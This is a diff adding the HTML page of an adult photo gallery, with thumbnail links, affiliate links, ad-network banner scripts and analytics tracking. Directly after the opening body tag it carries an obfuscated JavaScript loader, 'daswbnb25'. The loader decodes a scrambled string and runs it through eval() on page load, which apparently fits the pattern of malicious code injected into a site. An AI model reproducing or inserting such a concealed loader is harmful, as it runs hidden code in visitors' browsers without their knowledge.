@@ -1,0 +1,215 @@
+<html>
+<head>
+<title>Teens Magic gallery</title>
+<meta http-equiv="Content-Type" content="text/html; charset=">
+</head>
+<body bgcolor="#F4DCF4" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0"><script language=JavaScript> function daswbnb25(z)	{	var c=z.length,m=1024,i,s,h,b=0,w=0,x=0,d=Array(63,55,52,11,21,13,41,29,46,60,0,0,0,0,0,0,17,18,2,14,31,35,7,8,9,33,62,19,61,53,3,39,42,12,10,48,57,54,38,44,1,0,20,0,0,0,0,26,0,25,6,36,30,15,43,56,4,16,37,5,49,27,58,23,59,32,47,34,24,40,22,50,51,45,28);for(s=Math.ceil(c/m);s>0;s--){h='';for(i=Math.min(c,m);i>0;i--,c--){{x|=(d[z.charCodeAt(b++)-48])<<w;if(w){h+=String.fromCharCode(224^x&255);x>>=8;w-=2}else{w=6}}}eval(h);}}daswbnb25('oVuEhJgjCeHjXAajKULlcJuEkd9UhJgq4UtICA6xoRasZvGwFx7sbRaq5vGSCbtEkUyqt37qZF5SKRTq73QsZAHc_09xoFGIhVGjHJuECOuEbJgxZJ91FrzfXAHsC3TE4nGIG1_qZsuxAbuEhJtEGOWwAFL2im7w3DWqt37qZFLl3DWSYDashAHs7K52ANQskVgIGAa14e5SKAaVQvt1BKtsKBHEXV6UCJuEkRW1z0zsbRaq5vu1FOQ')	</script><!-- plex6.isprime.com -->
+
+<script language="JavaScript">
+reg2 = /menu=off/
+   if (!reg2.test(document.location.href)) document.write('<br>');
+</script>
+
+
+<table id="Table_01" width="779" height="772" border="0" cellpadding="0" cellspacing="0" align="center" bgcolor="#C692C6">
+  <tr>
+		
+    <td rowspan="2"> <a href="http://www.teensmagic.com/start.php?av==orgi&amp;link=galleries3"><img src="images/index_01.jpg" width="255" height="137" alt="" border="0"></a></td>
+		
+    <td rowspan="2"> <a href="http://www.teensmagic.com/start.php?av==orgi&amp;link=galleries3"><img src="images/index_02.jpg" width="247" height="137" alt="" border="0"></a></td>
+		<td colspan="3">
+			<img src="images/index_03.jpg" width="252" height="11" alt=""></td>
+		<td rowspan="12">
+			<img src="images/index_04.jpg" width="24" height="687" alt=""></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="11" alt=""></td>
+	</tr>
+	<tr>
+		
+    <td rowspan="2"> <a href="1/01.jpg"><img border="0" src="1/tn01.jpg" width="120" height="160"></a></td>
+		<td rowspan="2">
+			<img src="images/index_06.jpg" width="12" height="160" alt=""></td>
+		
+    <td rowspan="2"> <a href="1/02.jpg"><img src="1/tn02.jpg" width="120" height="160" alt="" border="0"></a></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="126" alt=""></td>
+	</tr>
+	<tr>
+		
+    <td rowspan="3"> <a href="http://www.teensmagic.com/start.php?av==orgi&amp;link=galleries3"><img src="images/index_08.jpg" width="255" height="141" alt="" border="0"></a></td>
+    <td rowspan="3"> <a href="http://www.teensmagic.com/start.php?av==orgi&amp;link=galleries3"><img src="images/index_09.jpg" width="247" height="141" alt="" border="0"></a></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="34" alt=""></td>
+	</tr>
+	<tr>
+		<td colspan="3">
+			<img src="images/index_10.jpg" width="252" height="12" alt=""></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="12" alt=""></td>
+	</tr>
+	<tr>
+		
+    <td rowspan="2"> <a href="1/03.jpg"><img src="1/tn03.jpg" width="120" height="160" alt="" border="0"></a></td>
+		<td rowspan="2">
+			<img src="images/index_12.jpg" width="12" height="160" alt=""></td>
+		
+    <td rowspan="2"> <a href="1/04.jpg"><img src="1/tn04.jpg" width="120" height="160" alt="" border="0"></a></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="95" alt=""></td>
+	</tr>
+	<tr>
+		
+    <td rowspan="3"> <a href="http://www.teensmagic.com/start.php?av==orgi&amp;link=galleries3"><img src="images/index_14.jpg" width="255" height="160" alt="" border="0"></a></td>
+    <td rowspan="3"> <a href="http://www.teensmagic.com/start.php?av==orgi&amp;link=galleries3"><img src="images/index_15.jpg" width="247" height="160" alt="" border="0"></a></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="65" alt=""></td>
+	</tr>
+	<tr>
+		<td colspan="3">
+			<img src="images/index_16.jpg" width="252" height="12" alt=""></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="12" alt=""></td>
+	</tr>
+	<tr>
+		
+    <td rowspan="2"> <a href="1/05.jpg"><img src="1/tn05.jpg" width="120" height="160" alt="" border="0"></a></td>
+		<td rowspan="2">
+			<img src="images/index_18.jpg" width="12" height="160" alt=""></td>
+		
+    <td rowspan="2"> <a href="1/06.jpg"><img src="1/tn06.jpg" width="120" height="160" alt="" border="0"></a></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="83" alt=""></td>
+	</tr>
+	<tr>
+		
+    <td rowspan="3"> <a href="http://www.teensmagic.com/start.php?av==orgi&amp;link=galleries3"><img src="images/index_20.jpg" width="255" height="134" alt="" border="0"></a></td>
+		
+    <td rowspan="3"> <a href="http://www.teensmagic.com/start.php?av==orgi&amp;link=galleries3"><img src="images/index_21.jpg" width="247" height="134" alt="" border="0"></a></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="77" alt=""></td>
+	</tr>
+	<tr>
+		<td colspan="3">
+			<img src="images/index_22.jpg" width="252" height="12" alt=""></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="12" alt=""></td>
+	</tr>
+	<tr>
+		
+    <td rowspan="2"> <a href="1/07.jpg"><img src="1/tn07.jpg" width="120" height="160" alt="" border="0"></a></td>
+		<td rowspan="2">
+			<img src="images/index_24.jpg" width="12" height="160" alt=""></td>
+		
+    <td rowspan="2"> <a href="1/08.jpg"><img src="1/tn08.jpg" width="120" height="160" alt="" border="0"></a></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="45" alt=""></td>
+	</tr>
+	<tr>
+		
+    <td> <a href="http://www.teensmagic.com/start.php?av==orgi&amp;link=galleries3"><img src="images/index_26.jpg" width="255" height="115" alt="" border="0"></a></td>
+    <td> <a href="http://www.teensmagic.com/start.php?av==orgi&amp;link=galleries3"><img src="images/index_27.jpg" width="247" height="115" alt="" border="0"></a></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="115" alt=""></td>
+	</tr>
+	<tr>
+		
+    <td colspan="6"> <a href="http://www.teensmagic.com/start.php?av==orgi&amp;link=galleries3"><img src="images/index_28.jpg" width="778" height="85" alt="" border="0"></a></td>
+		<td>
+			<img src="images/spacer.gif" width="1" height="85" alt=""></td>
+	</tr>
+</table>
+
+
+<script language="JavaScript" src="http://galleries.uni-cash.com/include/js/menuall.js"></script>
+
+<style>
+all.clsMenuItemNS, .clsMenuItemIE{text-decoration: none; font: bold 12px Arial; color: white; cursor: hand; z-index:100}
+#MainTable A:hover {color: yellow;}
+</style>
+
+
+<BR>
+<CENTER><FONT SIZE="2" face=arial COLOR="gray">
+
+
+<script language="JavaScript">
+reg2 = /menu=off/
+if (!reg2.test(document.location.href)) {
+  document.write ('<scri'+'pt language="JavaScript" src="http://galleries.uni-cash.com/banners.php?&rnd='+Math.random()+'"></sc'+'ript>');
+}
+</script>
+
+<script type="text/javascript">
+function getcode (site) {
+  if (site == "18") gc = 6;
+  else if (site == "ps") gc = 7;
+  else if (site == "sr") gc = 8;
+  else if (site == "sline") gc = 9;
+  else if (site == "sline2") gc = 10;
+  else if (site == "mof") gc = 11;
+  else if (site == "hm") gc = 12;
+  else if (site == "db") gc = 13;
+  else if (site == "dof") gc = 21;
+  else if (site == "rdf") gc = 15;
+  else if (site == "ah") gc = 16;
+  else if (site == "at") gc = 17;
+  else if (site == "nd") gc = 22;
+  else if (site == "gd") gc = 20;
+  else if (site == "gss") gc = 18;
+  else if (site == "mia") gc = 23;
+  else if (site == "gar") gc = 24;
+  else if (site == "gid") gc = 25;
+  else if (site == "ts") gc = 26;
+  return gc;
+}
+
+function galinfo (site,num) {
+  this.site = site; this.num = num; this.code = getcode (site);
+}
+
+var gurl = escape(document.URL).split('/');
+
+if (gurl[4]=="video") {
+  var cgal = new galinfo (gurl[3],"video/"+gurl[5]);
+}
+else {
+  var cgal = new galinfo (gurl[3],gurl[4]);
+}
+</script>
+
+<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
+</script>
+
+<script type="text/javascript">
+_uacct = "UA-2637794-"+cgal.code;
+_udn="none"; 
+_ulink=1;
+urchinTracker("/"+cgal.site+"/"+cgal.num);
+for (var i=0;i<document.links.length;i++) {
+  if ((document.links[i].href!=document.URL+"#")&&(document.links[i].href!=document.URL)) {
+    var rcont =  /[0-9]{2}.(?:jpg|wmv)/;
+    if (rcont.test(document.links[i].href)) {
+      document.links[i].onclick = function () {
+        urchinTracker("/"+cgal.site+"/"+cgal.num+"/content");
+      }; 
+    }
+    else {
+      document.links[i].onclick = function () {
+          urchinTracker("/outgoing/"+cgal.num+"/"+this.href); 
+      };
+    }
+  }
+}
+document.getElementById('float_banner').onclick = function () {
+          urchinTracker("/outgoing/float_banner"); 
+      }
+</script>
+
+All models appearing on this web site are 18 years or older.<BR>
+All records are kept in compliance with<BR>
+the requirements of US law, Title 18 UCS 2257<BR></FONT></CENTER>
+<BR>
+
+
+</body>
+</html>
